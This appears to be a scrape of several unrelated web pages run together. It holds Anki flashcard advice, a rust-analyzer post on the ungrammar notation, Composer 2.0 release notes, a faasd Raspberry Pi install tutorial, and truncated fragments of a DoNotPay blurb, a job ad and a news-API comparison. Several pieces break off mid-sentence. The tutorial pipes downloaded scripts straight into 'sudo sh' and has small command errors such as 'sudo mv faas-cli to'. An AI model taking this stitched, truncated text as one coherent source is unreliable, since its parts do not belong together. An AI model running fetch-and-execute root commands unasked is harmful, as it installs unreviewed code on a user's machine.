<p>Absolutely crucial to the effective use of Anki for even a moderate collection of cards is that answering a card should be a single mental motion.</p>
<p>What does this mean? We’ll demonstrate with some positive and negative examples.</p>
<ul>
<li>“What is the capital of France?” is probably answered with a single mental motion: it’s just “Paris”, obtained by a simple lookup in your memory.</li>
<li>“What is 367 times 399?” is many mental motions unless you are really unusually good at mental arithmetic. Almost everyone has to carry out some algorithm to get an answer to this question.</li>
<li>“What is the composition of air?” is probably many mental motions: for example, a lookup of “which gases are in air?” and a number of motions like “what proportion of air is this specific gas?”. Or it could be the various mental motions of “Which gas is the nth most common in air, and what is its proportion in air?” as n varies.</li>
<li>“What is the most common gas in air, and what is its proportion?” is very possibly a single mental motion despite the multiple components in its answer. For me, the knowledge that “nitrogen is the most common gas in air” is intimately bound up with “78% of air is nitrogen”; to answer one question is to access the same mental lump of storage as is required to answer the other question. Of course, for someone else, this may be two distinct facts and two distinct memory lookups.</li>
</ul>
<p>A card that is answered with one mental motion may be multiple motions for someone else; and a question answered with many mental motions may become one motion after you learn some additional fact or part of the model that ties the facts together. So it’s helpful if you personally keep track of what you’re doing to answer a given card, so that you can recognise some of this structure in your own mind.</p>
<p>Any card which is multiple mental motions should be broken down into smaller chunks.</p>
<p>If you’re doing too much work to answer a card, it’s important to notice, so that you can break the card down. And don’t worry that you might “break down a card too much”; if the cards are easy, Anki will exponentially decrease how often it shows them to you. The cost of creating a card that’s too easy is almost entirely in the time it takes you to create the card in the first place; a card that’s too difficult will sap your time and energy again and again.</p>

<p>As an example, recall the <a href="https://en.wikipedia.org/wiki/Ratio_test">ratio test for convergence</a>, likely to be covered in any first course in analysis:</p>
<p><em>Let$\sum_{n=1}^{\infty} a_n$ be a complex series, with each $a_i$ nonzero.<br>
Suppose that there is $a$ such that $|\frac{a_{n+1}}{a_n}| \to a$.<br>
Then, if $a &lt; 1$ then the series converges absolutely; if $a &gt; 1$ then the series diverges.</em></p>
<p>(We’ll discuss its proof in a later section.)</p>
<p>This statement has a number of moving parts, and is definitely much too large to appear as a single card. (Remember the rule of thumb: answering a single card should be a single mental motion.)<br>
How could we formulate this statement in an Anki-friendly way?</p>
<p>My own personal Anki collection contains the following cards. (Anki does allow LaTeX, though I often optimise for speed of card creation and just use plain text, however ugly it ends up. As long as it’s easily legible, it doesn’t need to be pretty.)</p>
<ul>
<li>What conditions exist on the ratio test? (answer: nonzero, sequence of ratios has a limit)</li>
<li>When does the ratio test let us conclude something? (answer: successive ratios converge to something not equal to 1)</li>
<li>Which cases exist on the ratio test? (answer: ratios converge to less than, or greater than, 1)</li>
<li>What can we say from the ratio test if the ratios converge to something less than 1? (answer: converges absolutely)</li>
<li>What can we say from the ratio test if the ratios converge to something greater than 1? (answer: diverges)</li>
<li>What can we say from the ratio test if the ratios converge to 1? (answer: nothing)</li>
<li>Give an example where the ratio test is inconclusive. (answer: <a href="https://en.wikipedia.org/wiki/Harmonic_series_(mathematics)">harmonic series</a>)</li>
</ul>
<p>All these cards are very simple; perhaps they might look laughably simple. This is fine! Remember that Anki will rapidly stop showing you cards you already know. Crucially each card is really a single mental motion to answer.</p>
<p>Note also that information is duplicated between cards. For example, there are two cards saying in slightly different ways that the ratio test talks about when successive ratios converge to something not equal to 1. Again, it’s fine to repeat information, because cards are cheap. Here, the information is duplicated to better facilitate the links between the cards: one card is a general “when can we conclude anything”, and one card is the same information rephrased as “which cases do I need to consider to produce more information here”. Without the additional rephrasing, there’s more of a risk of developing “isolated” clusters of cards; the aim is that given just the prompt “ratio test”, I can reproduce the <em>entire</em> cluster without thinking any further.</p>
<p>And don’t forget to store key examples and counterexamples!</p>

<p>Remembering a definition is rather like remembering the statement of a theorem.<br>
Without further ado, here is my definition of a <a href="https://en.wikipedia.org/wiki/Red-black_tree">red-black tree</a>:</p>
<ul>
<li>What, imprecisely, are the colouring rules on a red-black tree? (“global; local; base-case”)</li>
<li>What are the leaves of a red-black tree? (“null, black”)</li>
<li>What is the base-case colouring rule of a red-black tree? (“leaves are black”)</li>
<li>What is the local colouring rule of a red-black tree? (“red node =&gt; black children”)</li>
<li>What is the global colouring rule of a red-black tree? (“black depth is well defined”)</li>
<li>What is the black depth of a node in a red-black tree? (“the number of black nodes encountered on a path from that node down to a leaf”)</li>
</ul>
<p>Again, there is some duplication (two cards note that the leaves of a red-black tree are coloured black), and all the cards are extremely simple. The point is to make sure not only that the actual <em>content</em> is remembered, but also that the content is interlinked enough that you can reproduce the entire definition from the single prompt “red-black tree”. Moreover, one card is explicitly structural and carries no actual content as such: the card that lists the three types of colouring rule. This card is there solely to allow me to remember which <em>cards</em> are relevant.</p>
<p>Naively, one might create instead a single card, “what is a red-black tree?”. But in my experience, this is too big. If you’re reviewing even 30 cards a day, and …</p></div></div></div>

<br/>
October 24, 2020 | https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html | <a href="https://web.archive.org/web/*/https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>So, what exactly does “describing syntax trees” mean and why is it useful?
When writing an IDE, one of the core data structure is the concrete syntax tree.
It is a full-fidelity tree which represents the original source code in detail, including parenthesis, comments, and whitespace.
CSTs are used for initial analysis of the language.
They are also a vocabulary type for refactors.
Although the ultimate result of a refactor is a text diff, tree modification is a more convenient internal representation.</p>

<p>At the lowest level, the CST is typically unityped: there’s some <code>Node</code> superclass, which has a collection of <code>Node</code> children and an optional <code>Node</code> parent.
On top of this raw layer, a more AST-like API is provided: <code>Struct</code> has a <code>.name()</code> and a list of <code>.fields()</code>, etc.
This typed API is huge!
For rust-analyzer, it is comprised of more than 130 <em>types</em>!
And it is also more detailed than a typical AST: <code>Struct</code> also has <code>.l_curly()</code> and <code>.r_curly()</code>.</p>
<p>What’s worse, this API changes a lot, especially at the beginning.
You may start with nesting <code>.fields()</code> directly under the <code>Struct</code>, but then introduce a <code>StructFields</code> node for everything between the curly braces to share the code with enum variants.</p>
<p>In short, writing this by hand sucks :-)
Ungrammar is a notation to concisely describe the structure of the syntax tree, which can be used by a code generator to build an API in the target language.
If you’ve heard about <a href="https://www.oilshell.org/blog/2016/12/11.html">ASDL</a>, ungrammar is ASDL for concrete syntax trees.
For rust-analyzer’s case, that means taking the following input:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>Module =
  Attr* Visibility?
  'mod' Name
  (ItemList | ';')
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>And generating the following output:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>impl</span> <span>ast</span><span>::</span><span>AttrsOwner</span>      <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>VisibilityOwner</span> <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>NameOwner</span>       <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>Module</span> <span>{</span>
    <span>pub</span> <span>fn</span> <span>mod_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>item_list</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>ItemList</span><span>&gt;</span>    <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>semicolon_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In typical parser generators, something similar can be achieved by generating <em>both</em> the parser and the syntax tree from the same grammar.
This works to some extent, but has an inherent problem that the shape of the tree you want for the programmatic API, and the shape of the grammar you need to implement the parser are often different.
“Technical” transformations like left-recursion elimination don’t affect the language described by the grammar, but completely change the shape of the parse tree.
In contrast, ungrammar focuses solely on the second task, which radically reduces the complexity of the grammar.
In rust-analyzer, it is paired with a hand-written parser.</p>
<p>Treated as an ordinary (context free) grammar, ungrammar describes a superset of the language.
For example, for programmatic API it might be convenient to treat commas in comma-separate lists as a part of the list element
(rust-analyzer doesn’t do this yet, but it should).
This leads to the following ungrammar, which obviously doesn’t treat commas precisely:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>FieldList =
  '{' Field* '}'

Field:
  Name ':' Type ','?
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Similarly, ungrammar defines binary and unary expressions, but doesn’t specify their relative precedence and associativity.</p>
<p>An interesting side-effect is that the resulting grammars turn out to be pretty human readable.
For example, a full production ready Rust grammar takes about 600 short lines:<br></p>

<p>This might be a good fit for reference documentation!</p>

                    <h2 id="1-what-s-new">1/ What's new?</h2><p>The list of changes and improvements is long, check the <a href="https://github.com/composer/composer/releases/tag/2.0.0">complete changelog</a> if you are interested in reading it all. I will highlight a few key points here.</p><h3 id="performance-improvements">Performance improvements</h3><p>We overhauled pretty much everything from the protocol used between Composer and packagist.org to the dependency resolution, including downloading files in parallel using curl and constraint evaluation optimizations. This leads to massive improvements in terms of both speed and memory usage. The difference depends on your use case, so while I've seen reports of improvements of over 50% to both in some projects, I cannot put an exact number on it. But I am sure you will be positively surprised if you haven't tried Composer 2 yet.</p><p>As a side note to this, <code>require</code>/<code>remove</code> and partial updates are now much faster because Composer will now only load the metadata of the packages which are being changed.</p><figure><img src="https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png" alt="" srcset="https://blog.packagist.com/content/images/size/w600/2020/10/image_2020-10-24_175318.png 600w, https://blog.packagist.com/content/images/size/w1000/2020/10/image_2020-10-24_175318.png 1000w, https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png 1455w" sizes="(min-width: 1200px) 1200px"><figcaption>Time for initial update + install (bootstrapped project, empty cache) shows roughly 60% less time used by Composer 2 with ext-curl enabled</figcaption></figure><h3 id="architectural-changes-and-determinism">Architectural changes and determinism</h3><p>The way dependency updates are done internally was refactored, which, for you, will result in more deterministic updates. The current local state of the vendor directory will not interfere in updates anymore. </p><p>After an update is complete, the install process is run automatically and it will now execute all network bound operations first - and in parallel if possible. This will avoid leaving you with a half-updated vendor directory if a network error occurs midway through installation.</p><h3 id="runtime-features">Runtime features</h3><p>We added a <a href="https://getcomposer.org/doc/07-runtime.md#platform-check">platform-check step</a> when <code>vendor/autoload.php</code> gets initialized which checks the current PHP version/extensions match what is expected by your dependencies and fails hard otherwise.</p><p>There is a new class, <code>Composer\InstalledVersions</code>, which is autoloaded in every project and is available at runtime. It allows you to check which packages/versions are present at runtime of your own project.</p><p>See the <a href="https://getcomposer.org/doc/07-runtime.md">runtime docs</a> for more details.</p><p>If your code relies on any of these runtime features, you should require <code>"composer-runtime-api": "^2.0"</code> in your composer.json. This is a virtual package which is provided by Composer and will make sure people have to use Composer 2.x to install your package.</p><h3 id="error-reporting-improvements">Error reporting improvements</h3><p>Because things don't always go the way they're supposed to, we made sure to improve the error reporting shown to you when dependencies cannot be resolved. It's hard to give concrete examples here as there are a million ways this can fail but you will hopefully notice that messages are now shorter, clearer and less repetitive.</p><h3 id="partial-updates-with-temporary-constraints">Partial updates with temporary constraints</h3><p>Sometimes it can be useful to upgrade or downgrade a single package to a specific version, perhaps temporarily to test something or wait for a bug fix. You can now run <code>composer update vendor/package:1.0.*</code> for example (or <code>1.0.12</code> or any other version constraint), to run an update of only <code>vendor/package</code> to a version matching this additional constraint. This will not update your require in composer.json, and it will not mark the lock file out of date.</p><p>If you want to add/restrict a constraint but still do a full update of all dependencies, you can use <code>update --with vendor/package:1.0.*</code> which will run the update with that additional constraint.</p><h2 id="2-how-easy-is-it-to-upgrade">2/ How easy is it to upgrade?</h2><p>Our goal is that every Composer user can upgrade smoothly and swiftly. The gains are huge and we want everyone to benefit from them. To achieve that we did a few things:</p><ul><li>Composer 2.0 still supports PHP 5.3 and above, much like Composer 1.x</li><li><code>composer.lock</code> files are interoperable between versions, so you can upgrade to 2.0 and roll back easily if needed.</li><li>Most commands and arguments remain the same, and largely what you know about Composer remains true in 2.0.</li></ul><p>If you run <code>composer self-update</code> from 1.x, it will warn you that a new stable major version of Composer is available, and you can use <code>composer self-update --2</code> to migrate to it.</p><p>Should you encounter issues, you can go back at any time by using <code>composer self-update --1</code>. Hopefully that will make everyone feel comfortable to experiment with the new release.</p><p>If you are <a href="https://getcomposer.org/doc/faqs/how-to-install-composer-programmatically.md">installing Composer automatically</a> from the installer script, and wish to remain on Composer 1.x for the time being, you can also pass it a <code>--1</code> argument to prevent it from installing Composer 2.0 by default. If you do this please remember and aim to upgrade in a timely manner, as Composer 1.x will not be maintained for very long.</p><h2 id="3-backwards-compatibility-breaks">3/ Backwards compatibility breaks?</h2><p>Here are the main things likely to cause trouble with the upgrade process:</p><ul><li><strong>Plugins</strong>: This is probably going to be the major source of problems for most people. Plugins need to be updated to support Composer 2, and some of them are not ready, yet. Composer 2 will complain and fail to resolve dependencies if a plugin does not support it, so no need to overthink it, you can try it out and see how it goes.</li><li>The new <strong>platform-check feature</strong> means that Composer checks the runtime PHP version and available extensions to ensure they match the project dependencies. If a mismatch is found, the autoloader exits with error details to make sure problems are not overlooked. To avoid issues when deploying to production it is recommended to run <code>composer check-platform-reqs --no-dev</code> with the production PHP process as part of your build or deployment process.</li><li><strong>Repository priority</strong>: If a package exists in a higher priority repository, it will now be entirely ignored in lower priority repositories. If you seem to be missing packages when using Composer 2, see <a href="https://getcomposer.org/repoprio">repository priorities docs</a> for details.</li><li><strong>Invalid PSR-0 / PSR-4 configurations</strong> will not autoload anymore in optimized-autoloader mode, as per the warnings introduced in Composer 1.10. Mostly these warnings were for classes that were not meant to autoload anyway so I don't expect major issues, but it's safer to clean these up before upgrading.</li></ul><p>If you want to know more, I would highly recommend reading the <a href="https://github.com/composer/composer/blob/master/UPGRADE-2.0.md">UPGRADE</a> guide which has multiple sections for end users, plugin authors and Composer repository implementors.</p><h2 id="4-what-s-next">4/ What's next?</h2><p>We don't have a very detailed feature roadmap anymore as 2.0 contains tons of new goodies, but one important thing I want to explain is our PHP version support going forward.</p><p>As I mentioned above, Composer 2.0 supports PHP 5.3+, which is at this point very outdated and makes the code quite hard to maintain in places. We went through the effort to make sure every Composer user can upgrade to Composer 2, but the plan is to drop support for EOL PHP versions in a future minor release.</p><p>Composer 2.1 might still come with PHP 5.3 support, depending on the timeline and which features end up being included, but then at the latest by Composer 2.2 we will drop support for everything older than PHP 7.1.3. According to our stats this allows over 90% of the Composer users to use the latest version, and for the others who are stuck on outdated PHP versions we will keep providing critical bug and security fixes in the 2.0.x or 2.1.x range.</p><p>As for Composer 1.x, it is now more or less EOL. It will also receive critical fixes if anything comes up but the goal for everyone should be to migrate to 2.x as soon as possible.</p><p>Finally I want to thank everyone who contributed and helped make this a reality. The 2.0 release represents over 1100 commits from 28 people, 150+ GitHub issues and pull requests, plus everyone who test it, reviewed PRs, etc. It has been a huge effort with the first commits made about two years ago.</p><p>I also want to thank all our <a href="https://packagist.com/">Private Packagist</a> customers who helped finance this effort and afforded us the time we spent on all this. We sincerely hope everyone will appreciate the result!</p>

            <div><p>Kick the tires with faasd today, for a lightweight serverless experience that doesn't require Kubernetes. Instead it uses containerd and the existing OpenFaaS ecosystem.</p>
<blockquote>
<p>Last updated: 24th October 2020 - upgraded faasd &amp; containerd versions. Added instructions for core components logs such as the gateway.</p>
</blockquote>
<p>You can run <a href="https://github.com/openfaas/faasd">faasd</a> anywhere, even on a <a href="https://www.raspberrypi.org/">Raspberry Pi</a>, but why would you want to do that? faasd offers many of the benefits of containers and <a href="https://github.com/openfaas/faas">OpenFaaS</a>, but without the complexity and operational costs of Kubernetes. <a href="https://github.com/containerd/containerd">containerd</a> is a low-level tool for automating containers, and a <a href="https://landscape.cncf.io/">CNCF project</a>.</p>
<p><img src="https://blog.alexellis.io/content/images/2019/12/ofctr.png" alt="OpenFaaS and containerd logos"></p>
<p>The use-cases for <a href="https://blog.alexellis.io/introducing-functions-as-a-service/">Serverless / FaaS are fairly well-known</a>, but you could use faasd at the edge, in a smart-car, as part of an IoT device, for crunching data before uploading samples to the cloud, for webhook receivers/alerting, bots, webservices, API integrations or even providing your own APIs. Compute is compute, and OpenFaaS with containerd makes it easy to both consume and provide.</p>
<blockquote>
<p>🚀 Support the development of faasd - <a href="https://github.com/sponsors/openfaas">Sponsor OpenFaaS on GitHub</a><br>
⭐️ Star or fork <a href="https://github.com/openfaas/faasd">faasd on GitHub</a></p>
</blockquote>
<h2 id="beforewestart">Before we start</h2>
<p>Use Raspbian Lite (now called RaspiOS) for this tutorial. Do not install Docker on the same Raspberry Pi as it may cause conflicts with networking and the version of containerd we are using.</p>
<p>You should use RPi 2, 3 or 4. If you have only one Raspberry Pi, then you'll be able to deploy pre-built images from the OpenFaaS Function Store, but if you have a second Raspberry Pi, then you can use it to build new functions too.</p>
<p>You can also deploy to a PC or cloud VM:</p>
<ul>
<li><a href="https://www.openfaas.com/blog/faasd-tls-terraform/">Deploy faasd to DigitalOcean with Terraform</a></li>
<li><a href="https://github.com/openfaas/faasd/blob/master/docs/MULTIPASS.md">Deploy faasd to your laptop with Multipass</a></li>
</ul>
<h2 id="installation">Installation</h2>
<p>Installation only takes a few moments, and in the future should be quicker if we can secure binaries for containerd from the upstream project.</p>
<h3 id="getfaascli">Get <code>faas-cli</code></h3>
<p>The <a href="https://github.com/openfaas/faas-cli/">faas-cli</a> can be used to build, deploy, manage, and invoke functions with OpenFaaS. OpenFaaS offers a REST API, asynchronous invocations, authentication, metrics, and a UI out of the box.</p>
<p>Install using the utility script, or alternatively the binaries are also available on the <a href="https://github.com/openfaas/faas-cli/releases">releases page</a>.</p>
<pre><code># Install to local directory
curl -sLfS https://cli.openfaas.com | sh
sudo mv faas-cli to /usr/local/bin

# Or run with sudo to move to /usr/local/bin in one step
curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<p>See also: <a href="https://docs.openfaas.com/">OpenFaaS docs</a></p>
<h3 id="getcontainerd">Get containerd</h3>
<p>Unfortunately the <a href="https://github.com/containerd/containerd">containerd</a> maintainers only provide binaries for <code>x86_64</code> (regular PCs), so we have to install Go and build containerd from source.</p>
<p>We'll install some dependencies that will help us in the tutorial and after installation</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    runc \
    bridge-utils \
    tmux \
    git
</code></pre>
<p>Pick option A or B.</p>
<h4 id="ausemycontainerdarmhfbinariesfast">A) Use my containerd armhf binaries (fast)</h4>
<p>I have compiled binaries for containerd, which you can use if you wish. <a href="https://github.com/alexellis/containerd-armhf/releases">alexellis/containerd/armhf</a>.</p>
<pre><code>curl -sSL https://github.com/alexellis/containerd-arm/releases/download/v1.3.5/containerd-1.3.5-linux-armhf.tar.gz | sudo tar -xvz --strip-components=1 -C /usr/local/bin/
</code></pre>
<h4 id="bbuildyourowncontainerdbinariesslow">B) Build your own containerd binaries (slow)</h4>
<p>Raspbian needs a few additional build-time dependencies for containerd:</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    build-essential \
    libbtrfs-dev \
    libseccomp-dev
</code></pre>
<p>You can use my utility script to build containerd now:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas
git clone https://github.com/openfaas/faasd

cd cd faasd

./hack/build-containerd-armhf.sh
</code></pre>
<p>This could take a few moments on RPi2 or 3, and is a little quicker on RPi4.</p>
<h3 id="configurecontainerdtostartonboot">Configure containerd to start on boot</h3>
<p>Install a systemd unit file for <code>containerd</code>:</p>
<pre><code>curl -SLfs https://raw.githubusercontent.com/containerd/containerd/v1.3.5/containerd.service | sudo tee /etc/systemd/system/containerd.service

sudo systemctl enable containerd
sudo systemctl start containerd
</code></pre>
<p>Check that <code>containerd</code> started with <code>sudo systemctl status containerd</code>, if not then you may need to <code>unmask</code> it and run the commands again. See <a href="https://blog.ruanbekker.com/blog/2017/12/09/unmask-a-masked-service-in-systemd/">unmasking a service</a>.</p>
<h3 id="installnetworking">Install networking</h3>
<ul>
<li>
<p>Enable the Kernel's bridge module</p>
<pre><code># One-off
sudo modprobe br_netfilter &amp;&amp; \
sudo sysctl net.bridge.bridge-nf-call-iptables=1

# Make it permanent
echo "br_netfilter" | sudo tee -a /etc/modules-load.d/modules.conf

echo "net.bridge.bridge-nf-call-iptables=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
</li>
<li>
<p>Install CNI plugins</p>
<p>Fortunately there are upstream ARM binaries available for the CNI plugins.</p>
<pre><code>sudo mkdir -p /opt/cni/bin

curl -sSL https://github.com/containernetworking/plugins/releases/download/v0.8.5/cni-plugins-linux-arm-v0.8.5.tgz | sudo tar -xz -C /opt/cni/bin
</code></pre>
</li>
<li>
<p>Enable NAT</p>
<p>Enable NAT between the container network and your wider network and the Internet:</p>
<pre><code>sudo /sbin/sysctl -w net.ipv4.conf.all.forwarding=1

echo "net.ipv4.conf.all.forwarding=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
<p>Optional step - if you have Docker running on your system, then disable it and reboot at this point.</p>
<pre><code>sudo systemctl disable docker
sudo systemctl disable docker.sock # or docker.socket - You may also need this step
</code></pre>
<p>Docker's IP address range conflicts with the one chosen by netns, this will be resolved when moving to CNI.</p>
</li>
</ul>
<h3 id="getfaasd">Get <code>faasd</code></h3>
<p>faasd is a Go binary that runs on your system and packages all of OpenFaaS, it's a similar tool to docker-compose.</p>
<p>One of faasd's commands <code>faasd provider</code> runs an OpenFaaS provider which implements the OpenFaaS "CRUD" API for functions.</p>
<p>Clean-up old versions, if required:</p>
<pre><code># Stop systemd services, if you have them
sudo systemctl stop faasd
sudo systemctl stop faasd-provider

# Remove old binaries if you have them
sudo rm -rf /usr/local/bin/faasd
</code></pre>
<p>Download the faasd binary:</p>
<pre><code>sudo curl -sSLf "https://github.com/openfaas/faasd/releases/download/0.9.5/faasd-armhf" \
    --output "/usr/local/bin/faasd" \
    &amp;&amp; sudo chmod a+x "/usr/local/bin/faasd"
</code></pre>
<p>Now run the installation:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir -p $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas

git clone https://github.com/openfaas/faasd --depth=1

cd faasd

sudo faasd install
</code></pre>
<h2 id="postinstall">Post-install</h2>
<p>The <code>faasd install</code> command creates two systemd unit files which can be used to start/stop <code>faasd</code> and <code>faasd-provider</code>.</p>
<h3 id="checktheinstallation">Check the installation</h3>
<p>Check the services:</p>
<pre><code>sudo systemctl status faasd
sudo systemctl status faasd-provider
</code></pre>
<p>Find logs:</p>
<pre><code>sudo journalctl -u faasd --lines 40
sudo journalctl -u faasd-provider --lines 40
</code></pre>
<p>You'll find your login details for the gateway in <code>/var/lib/faasd/secrets</code>, the user is <code>admin</code> and the password is in <code>/var/lib/faasd/secrets/basic-auth-password</code></p>
<h3 id="checkthelogsfromtheopenfaascoreservices">Check the logs from the OpenFaaS Core Services</h3>
<p>You can access the logs from any of the core services deployed with faasd as follows:</p>
<pre><code>sudo journalctl -t default:gateway --lines 40
sudo journalctl -t default:nats --lines 40
sudo journalctl -t default:queue-worker --lines 40
sudo journalctl -t default:prometheus --lines 40
</code></pre>
<p>For more, see the <code>docker-compose.yaml</code> file in the current directory.</p>
<h3 id="accessopenfaasfromyourlaptop">Access OpenFaaS from your laptop</h3>
<p>faasd deploys OpenFaaS along with its core logic <code>faasd-provider</code>, which uses containerd instead of Kubernetes to start, stop, and manage functions.</p>
<p>The <code>faasd</code> process will proxy any incoming requests on HTTP port 8080 to the OpenFaaS gateway container, you can also find the IP of the container in your <code>hosts</code> file in the <code>faasd</code> directory.</p>
<p>You can also access the built-in Prometheus container by editing <code>docker-compose.yaml</code> to expose its ports, either to 127.0.0.1, or all your network adapters.</p>
<h3 id="deployafunctionfromthestore">Deploy a function from the store</h3>
<p>Obtain your OpenFaaS password. You need to run this command on your Raspberry Pi:</p>
<pre><code>sudo cat /var/lib/faasd/secrets/basic-auth-password
</code></pre>
<p>Log in to the gateway, either on your RPi, or from your own computer.</p>
<pre><code># If connecting remotely
export IP=192.168.0.101
export OPENFAAS_URL=http://$IP:8080
echo $PASSWORD | faas-cli login

# Or on device:

sudo cat /var/lib/faasd/secrets/basic-auth-password | faas-cli login --password-stdin
</code></pre>
<p>Look at what's available in the function store for the armhf platform, then deploy something:</p>
<pre><code>faas-cli store list --platform armhf

# Deploy figlet
faas-cli store deploy --platform armhf figlet

# Find the URLs for the function
faas-cli store inspect figlet

# Create some ASCII

echo "faasd" | faas-cli invoke figlet
</code></pre>
<p>Try a function that can generate an <code>identicon</code> like you may have seen for default avatar logos on GitHub.com</p>
<pre><code>faas-cli store deploy --platform armhf identicon

echo $USER | faas-cli invoke identicon &gt; avatar.png
</code></pre>
<p>Here's an example of the avatar for the user <code>pi</code>:</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/avatar.png" alt="avatar"></p>
<h3 id="runanasyncfunction">Run an async function</h3>
<p>You can also run your functions in the background or asynchronously.</p>
<p>Create a webhook receiver using a public service such as:</p>
<ul>
<li><a href="https://requestbin.com/">https://requestbin.com/</a></li>
<li><a href="https://postb.in/">https://postb.in/</a></li>
</ul>
<pre><code>faas-cli store deploy --platform armhf nodeinfo

curl -d "verbose" \
  http://127.0.0.1:8080/async-function/nodeinfo \
  --header "X-Callback-Url: https://postb.in/1578562711776-8760500776115"
</code></pre>
<p>You'll be able to refresh your webhook receiver and see the value.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/Screenshot-2020-01-09-at-09.41.11.png" alt="Screenshot-2020-01-09-at-09.41.11"></p>
<h3 id="buildanewcontainerimage">Build a new container image</h3>
<p>You'll need a second Raspberry Pi for this step since we do not have <code>docker</code> installed on the device.</p>
<p>There are a couple of workarounds if you don't have a second device: use buildkit per as my post <a href="https://blog.alexellis.io/building-containers-without-docker/">Building containers without Docker</a>. Or build on your PC using <a href="https://github.com/alexellis/multiarch-templates">one of my multi-arch templates</a>.</p>
<p>You can also use one of my prebuilt functions such as <a href="https://github.com/alexellis/2020/">ascii-2020</a>, but you should only run the <code>faas-cli deploy</code> step.</p>
<ul>
<li>
<p>Log into the Raspberry Pi with <code>ssh</code> and install the <code>faas-cli</code> and <code>docker</code>.</p>
<pre><code>curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<pre><code>curl -sLfS https://get.docker.com | sudo sh

sudo usermod -aG docker pi
newgrp
</code></pre>
</li>
<li>
<p>Log into the Docker Hub</p>
<pre><code>docker login
</code></pre>
</li>
<li>
<p>Create a Golang function</p>
<pre><code>export DOCKER_HUB_NAME="alexellis2"

faas-cli template store pull golang-middleware

faas-cli new --lang golang-middleware \
  hello-world \
  --prefix $DOCKER_HUB_NAME
</code></pre>
</li>
<li>
<p>Now build and push the image</p>
<pre><code>faas-cli push -f hello-world.yml
faas-cli deploy -f hello-world.yml
</code></pre>
</li>
</ul>

They should be on your Freebie List too.</h2></div></div><div><div><h3>DoNotPay</h3><p>The DoNotPay app is the home of the world's first robot lawyer.

Team is known to have an unheard of product-shipping cadence, delivering new (great) products to users consistently.<br>• You enjoy high momentum &amp; impact.

              News information is important for many different use cases from brand monitoring to trend discovery to financial news monitoring. Many companies rely on news monitoring to find new opportunities in the markets, including new clients.
            </p>

            <p>
              For the most basic use cases <a href="https://news.google.com/">Google News</a> or <a href="https://www.google.com/alerts">Google Alerts</a> may be enough, but both of these services have many limitations that prevent them from being used on a bigger scale.
            </p>
            <p>
              Unfortunately Google News does not provide a convenient way to retrieve a big amount of relevant data, as it poses a strict limit on the number of articles that could be retrieved per query. Yet another concern is rate limiting restrictions. Google News is primarily focused on human users, not robots, therefore you risk getting your ip banned when trying to make a large amount of queries programmatically.
            </p>
            <p>
              The search interface is also far from perfect, as it does not allow building complex queries, in contrast to
              <a href="https://www.elastic.co/what-is/elasticsearch">modern full-text search storage solutions</a>, which provide a wide variety of operators for building search queries of almost any complexity.

            <!-- Text -->
            <p>
              Let’s go over the main features and make a side-by-side comparison with Google News.
            </p>

            <ul>
              <li>

                <!-- Text -->
                <h3>
                  Maximum number of articles returned per query.
                </h3>

                <ul>
                  <li>
                    Google News has a max limit of <span>100</span> articles per query without any possibility to retrieve more. This may be a big limitation if the search keyword is very popular and may contain thousands or even tens of thousands of relevant articles.
                  </li>
                  <li>
                    In contrast, Datanews News API provides access to <span>all of the relevant articles whenever they were published</span>. The API uses
                    <a href="https://en.wikipedia.org/wiki/Pagination">pagination</a> for efficient transfer of a large amount of articles through the network.
                  </li>
                </ul>
              </li>

              <li>

                <!-- Text -->
                <h3>
                  Available news article metadata.
                </h3>

                <ul>
                  <li>
                    Google News provides a limited amount of metadata about each particular article. It usually includes the publication date, description field, title and the original article link.
                  </li>
                  <li>
                    Datanews API returns more additional information about each article, which is directly extracted from webpage: original article link, title, description, publication date, domain of the publication, url of the image on the article page, <span>list of authors</span>, language, country, <span>snippet of the content</span>.
                  </li>

              Choosing between <a href="https://news.google.com/">Google News</a> and other News API is really about your use case. If you need something simple just for personal use, then going with Google News or Google Alerts will make perfect sense.
            </p>
            <p>
              Otherwise, if you plan to build some software system with bigger scale, then going with an existing news API provider like <a href="https://datanews.io/">Datanews</a> will make more sense. It will provide you with a reliable and complete news monitoring solution that is ready to be integrated into your product.

